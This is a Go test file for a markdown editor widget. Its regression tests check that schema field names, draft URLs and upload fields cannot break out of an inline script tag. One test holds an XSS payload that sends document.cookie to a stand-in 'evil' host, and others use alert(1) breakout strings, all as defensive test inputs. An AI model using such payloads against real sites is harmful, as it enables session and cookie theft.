package mdeditor

import (
	"strings"
	"testing"
)

// A schema field name is attacker-controlled: anyone with schema-write on a
// single namespace picks it. It used to be interpolated into an inline
// <script> as template.JS, which html/template emits verbatim.
func TestRender_FieldNameCannotBreakOutOfScript(t *testing.T) {
	payload := `a</script><script>fetch('//evil/'+document.cookie)</script>`

	out, err := Render(payload, "body text", Options{DraftURL: "/api/drafts/s/i/f"})
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	got := string(out)

	// The literal closing tag must never survive into the output — that is
	// what ends the script element early and turns the rest into markup.
	if strings.Contains(got, "</script><script>") {
		t.Errorf("field name broke out of the script element:\n%s", got)
	}
	// The payload's own script open tag must not appear unescaped either.
	if strings.Contains(got, "<script>fetch(") {
		t.Errorf("injected script tag survived escaping:\n%s", got)
	}
}

// The draft URL is derived from the field name too, so it reaches the same
// sink by a second route.
func TestRender_DraftURLCannotBreakOutOfScript(t *testing.T) {
	out, err := Render("body", "", Options{
		DraftURL: `/api/drafts/x</script><script>alert(1)</script>`,
	})
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	if strings.Contains(string(out), "</script><script>alert(1)") {
		t.Errorf("draft URL broke out of the script element:\n%s", out)
	}
}

// Guard the happy path so the escaping fix doesn't quietly break the widget.
func TestRender_NormalFieldStillWorks(t *testing.T) {
	out, err := Render("body", "hello", Options{DraftURL: "/api/drafts/s/i/body"})
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	got := string(out)
	for _, want := range []string{
		`name="body"`,
		"initMarkdownEditor(",
		"draftURL",
		"hello",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("rendered widget missing %q:\n%s", want, got)
		}
	}
}

// Without Upload the widget offers no image controls and sends no upload
// config to the script.
func TestRender_NoUploadNoImageControls(t *testing.T) {
	out, err := Render("body", "", Options{})
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	got := string(out)
	for _, unwanted := range []string{"md-img-btn", "md-img-file", "md-img-status", `"upload"`} {
		if strings.Contains(got, unwanted) {
			t.Errorf("widget without Upload should not contain %q:\n%s", unwanted, got)
		}
	}
}

// With Upload the widget renders the Image button, a hidden file picker
// limited to the formats the upload endpoint stores, a live status region,
// and passes the upload config to initMarkdownEditor.
func TestRender_UploadRendersImageControls(t *testing.T) {
	out, err := Render("body", "", Options{Upload: &UploadOptions{
		URL:         "/api/upload",
		Fields:      map[string]string{"namespace": "site", "schema": "journal", "field": "body"},
		MediaPrefix: "/media/",
		PublicBase:  "https://media.example.com",
	}})
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	got := string(out)
	for _, want := range []string{
		`class="md-img-btn"`,
		`accept="image/png,image/jpeg,image/gif,image/webp"`,
		`class="md-img-status" role="status" aria-live="polite"`,
		`"upload":{`,
		`"url":"/api/upload"`,
		`"namespace":"site"`,
		`"mediaPrefix":"/media/"`,
		`"publicBase":"https://media.example.com"`,
	} {
		if !strings.Contains(got, want) {
			t.Errorf("rendered widget missing %q:\n%s", want, got)
		}
	}
}

// An Upload with no URL is treated as disabled rather than rendering a
// button that would POST to the current page.
func TestRender_UploadWithoutURLIsDisabled(t *testing.T) {
	out, err := Render("body", "", Options{Upload: &UploadOptions{}})
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	if strings.Contains(string(out), "md-img-btn") {
		t.Errorf("Upload without URL should not render image controls:\n%s", out)
	}
}

// Upload field values reach the inline <script> too; they must be escaped
// like the field name.
func TestRender_UploadFieldsCannotBreakOutOfScript(t *testing.T) {
	out, err := Render("body", "", Options{Upload: &UploadOptions{
		URL:    "/api/upload",
		Fields: map[string]string{"namespace": `x</script><script>alert(1)</script>`},
	}})
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	if strings.Contains(string(out), "</script><script>alert(1)") {
		t.Errorf("upload field broke out of the script element:\n%s", out)
	}
}
